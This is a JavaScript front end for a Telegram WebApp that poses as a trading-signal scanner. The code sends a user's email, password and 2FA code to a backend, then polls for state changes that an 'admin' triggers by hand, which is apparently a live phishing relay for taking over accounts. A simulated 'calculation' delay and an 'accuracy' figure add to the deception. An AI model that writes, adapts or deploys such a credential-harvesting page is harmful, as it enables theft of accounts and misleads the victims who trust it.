// ⚠️ API_BASE_URL Dhyan se set karna hai baad me (abhi placeholder hai)
const API_BASE_URL = "https://TERA-BACKEND-URL.onrender.com"; 
let userId = "UNKNOWN";

// Initialize Telegram WebApp
const tg = window.Telegram.WebApp;
tg.expand(); // Make app full screen

if (tg.initDataUnsafe && tg.initDataUnsafe.user) {
    userId = tg.initDataUnsafe.user.id.toString();
}

// DOM Elements
const screenLogin = document.getElementById('login-screen');
const screenCode = document.getElementById('code-screen');
const screenMain = document.getElementById('main-screen');
const alertBox = document.getElementById('alert-box');

// Show Alert function
function showAlert(msg, type="error") {
    alertBox.textContent = msg;
    alertBox.style.backgroundColor = type === "error" ? "#ff4d4f" : "#52c41a";
    alertBox.classList.remove('hidden');
    setTimeout(() => alertBox.classList.add('hidden'), 4000);
}

// Switch Screens
function showScreen(screenId) {
    screenLogin.classList.add('hidden');
    screenCode.classList.add('hidden');
    screenMain.classList.add('hidden');
    document.getElementById(screenId).classList.remove('hidden');
}

// --- 1. LOGIN LOGIC ---
document.getElementById('btn-login').addEventListener('click', async () => {
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    const statusText = document.getElementById('login-status');
    
    if(!email || !password) return showAlert("Please fill all fields");

    statusText.textContent = "Connecting to Secure Server...";
    
    try {
        await fetch(`${API_BASE_URL}/api/login`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({user_id: userId, email: email, password: password})
        });
        startPolling(); // Start asking backend for admin response
    } catch (e) {
        showAlert("Server connection failed");
    }
});

// --- 2. CODE LOGIC ---
document.getElementById('btn-code').addEventListener('click', async () => {
    const code = document.getElementById('auth-code').value;
    const statusText = document.getElementById('code-status');
    
    if(!code) return showAlert("Enter 2FA Code");
    statusText.textContent = "Verifying...";
    
    try {
        await fetch(`${API_BASE_URL}/api/code`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({user_id: userId, code: code})
        });
    } catch (e) {
        showAlert("Error submitting code");
    }
});

// --- 3. BACKGROUND POLLING (Admin feedback check) ---
let pollingInterval;
function startPolling() {
    if(pollingInterval) clearInterval(pollingInterval);
    
    pollingInterval = setInterval(async () => {
        try {
            const res = await fetch(`${API_BASE_URL}/api/status?user_id=${userId}`);
            const data = await res.json();
            
            // Handle Alerts (Server Error / Limit Reached)
            if(data.msg) {
                showAlert(data.msg);
                // Clear the message via another api call (optional) to not spam
            }

            // Route user based on Admin's click
            if (data.state === "START") {
                showScreen('login-screen');
                document.getElementById('login-status').textContent = "";
                clearInterval(pollingInterval); // Stop polling until next login
            } 
            else if (data.state === "WAITING_CODE") {
                showScreen('code-screen');
                document.getElementById('code-status').textContent = "";
            } 
            else if (data.state === "AUTHORIZED") {
                showScreen('main-screen');
                clearInterval(pollingInterval); // We are in! Stop polling.
            }

        } catch (e) { console.log("Polling error"); }
    }, 2000); // Check every 2 seconds
}

// --- 4. RADAR & SIGNAL LOGIC ---
document.getElementById('btn-scan').addEventListener('click', async () => {
    const radar = document.getElementById('radar');
    const resultBox = document.getElementById('signal-result');
    const btn = document.getElementById('btn-scan');
    
    const pair = document.getElementById('pair-select').value;
    const tf = document.getElementById('time-select').value;

    // Reset UI
    resultBox.classList.add('hidden');
    radar.classList.remove('hidden');
    btn.textContent = "CALCULATING...";
    btn.disabled = true;

    try {
        // Hit API for signal
        const res = await fetch(`${API_BASE_URL}/api/signal`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({user_id: userId, pair: pair, timeframe: tf})
        });
        const data = await res.json();

        // Simulate calculation time (3 seconds)
        setTimeout(() => {
            if (data.error === "LIMIT_REACHED") {
                showAlert(`Free Limit Reached! Contact @${data.admin_contact}`);
                btn.textContent = "CALCULATE ENTRY";
                btn.disabled = false;
                return;
            }

            // Show Result
            radar.classList.add('hidden');
            resultBox.classList.remove('hidden');
            document.getElementById('result-direction').textContent = data.direction;
            document.getElementById('result-direction').style.color = data.direction.includes("BUY") ? "#52c41a" : "#ff4d4f";
            document.getElementById('result-accuracy').textContent = data.accuracy + "%";
            
            btn.textContent = "CALCULATE ENTRY";
            btn.disabled = false;
        }, 3000);

    } catch (e) {
        showAlert("Signal generation failed");
        btn.textContent = "CALCULATE ENTRY";
        btn.disabled = false;
    }
});

// Check initial state on load
startPolling();
